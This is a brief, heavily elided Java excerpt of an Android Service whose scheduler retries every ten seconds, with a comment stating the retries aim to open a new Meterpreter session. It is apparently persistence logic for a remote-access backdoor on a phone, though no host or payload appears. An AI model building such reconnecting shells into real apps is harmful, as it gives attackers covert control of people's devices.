...
public class MyIntentService extends Service {
    ...
    public void periodicallyAttempt(){
        ...
        long ten_seconds = 10; //time passing between each attempt to open a new meterpreter session
        ...
        beeperHandle = scheduler.scheduleAtFixedRate(beeper, ten_seconds, ten_seconds, TimeUnit.SECONDS);
